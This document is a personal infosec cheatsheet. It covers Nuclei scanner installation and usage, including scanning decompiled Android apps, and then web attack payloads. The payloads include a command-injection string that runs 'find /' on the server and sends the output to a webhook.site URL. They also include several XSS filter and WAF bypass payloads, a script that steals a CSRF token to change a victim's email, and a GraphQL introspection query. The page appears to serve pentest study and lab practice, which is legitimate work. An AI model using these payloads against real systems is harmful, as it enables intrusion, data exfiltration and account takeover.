---
title: Awesome Cheatsheets InfoSec
tags:
  - infosec
  - helpful
  - command
  - usage
---

![[meme-blind-choice.png|center]]

>[!info]
>This page is place where I store command, configuration and moreover around information security.
# Nuclei

>[!info]
>Fast and customizable vulnerability scanner based on simple YAML based DSL.

1. [GitHub - nuclei](https://github.com/projectdiscovery/nuclei)
2. [Nuclei - Documentation](https://docs.projectdiscovery.io/tools/nuclei/overview)
## Install `nuclei`

For install `nuclei`, you need to make sure your host installed golang, that is the fastest way to help you install `nuclei` for your host

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

Or you can try to install binary version from [release page](https://github.com/projectdiscovery/nuclei/releases) of `nuclei`

```bash
wget https://github.com/projectdiscovery/nuclei/releases/download/v3.3.0/nuclei_3.3.0_linux_amd64.zip

mkdir -p nuclei_unzip

unzip -d nuclei_unzip nuclei_3.3.0_linux_amd64.zip

sudo mv ./nuclei_unzip/nuclei /usr/local/bin

rm -rf nuclei_unzip nuclei_3.3.0_linux_amd64.zip
```

## Setup `nuclei-templates` for default

>[!info]
>I will become useful to cut off or you want specific your `nuclei-templates` and update that to become default templates of `nuclei` on run and target

```bash
nuclei -update-template-dir /path/to/your/nuclei-templates/
```

## Specific template and tags for scan with sort of endpoints

```bash
nuclei -tags lfi,ssrf,rce -t dast/vulnerabilities/ -l targets.txt
```

## Run `nuclei` with android app

With android platform, when you try to pentest this platforms, you will need bunch of tools to help you handle

- [apktool](https://apktool.org/docs/install/) : A tool for reverse engineering Android apk files
- [mobile-nuclei-templates](https://github.com/optiv/mobile-nuclei-templates) : `nuclei-templates` for mobile platforms

First of all, you need to reverse your `apk` to metadata and information include inside this target with `apktool`

```bash
java -jar apktool_2.9.3.jar d /path/to/apk -o /path/to/output_apktool
```

Now you can use `nuclei` to perform scanning inside output of `apktool`

```bash
# NOTE: Install mobile nuclei template with mobile inside your default nuclei-templates location
echo /path/to/output_apktool | nuclei -t mobile/
```

# Command Injection

## With webhook

```html
<embed src=1 onload="fetch(./?eval=require( 'child_process' ).spawnSync( 'find', ['/']).stdout.toString()).then(a=>a.text()).then(a=>fetch('https://webhook.site/ae0bd822-b34b-4e87-aa65-3c22bc4c9999?c=%27+btoa(a)))%22%3E
```

>[!note]
>Command will exec a find command in location `/` after that send all that to plain text to webhook in URL `https://webhook.site/...`

# Cross Site Scripting ( XSS )

## Unique scripts which used to bypass specify situations

```javascript
onmouseover="alert('xss')
"><svg onload="alert('xss')">
<img src=# onerror='alert(1)'>
javascript:alert('xss')
'-alert(document.domain)-'
';alert(document.domain)//
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

## DOM XSS with Angular expression

```javascript
{{constructor.constructor('alert(1)')()}}
```

## Arithmetic operator with JS –> Cause Reflected DOM XSS

```javascript
\"-alert(1)}//
```

## Stored DOM XSS bypass the encode bracket

```javascript
<><img src=1 onerror=alert(1)>
```

## Script for executing CSRF Form for XSS by using token CSRF

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

## Tip for causing XSS with block by WAF (web applications firewall)

- Brute force to find the tag can available
- Try to execute attribute with tag available
- And force the website do the event –> Execute the XSS. For example

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

## Use own tag

>[!info]
>If on situation the server block all of tag can inject into the code –> we need to create them own like `<xss>`

```javascript
<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x
```

## Payload can help you filter xss via press event by key button to causing the reflect

```javascript
%27accesskey=%27x%27onclick=%27alert(1)
```

## Add `\` splash for bypass filter

>[!info]
>If some case study like they add black splash `/` after you input that with quote so with causing reflect xss using close tag for `</script>` for ignore that situation and after that causing payload

```javascript
<\script><script>alert(1)<\script>
```

# GraphQL

>[!info]
>The helpful reference is put on this article [Hackwekend - Session 3 Attack and Exploit GraphQL](https://hackmd.io/@XeusNguyen/rJ0j0WR-p) 
## GraphQL with get full introspection

```json
query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      types {
        ...FullType
      }
      directives {
        name
        description
        locations
        args {
          ...InputValue
        }
      }
    }
  }
  fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
      name
      description
      args {
        ...InputValue
      }
      type {
        ...TypeRef
      }
      isDeprecated
      deprecationReason
    }
    inputFields {
      ...InputValue
    }
    interfaces {
      ...TypeRef
    }
    enumValues(includeDeprecated: true) {
      name
      description
      isDeprecated
      deprecationReason
    }
    possibleTypes {
      ...TypeRef
    }
  }
  fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
  }
  fragment TypeRef on __Type {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                }
              }
            }
          }
        }
      }
    }
  }
```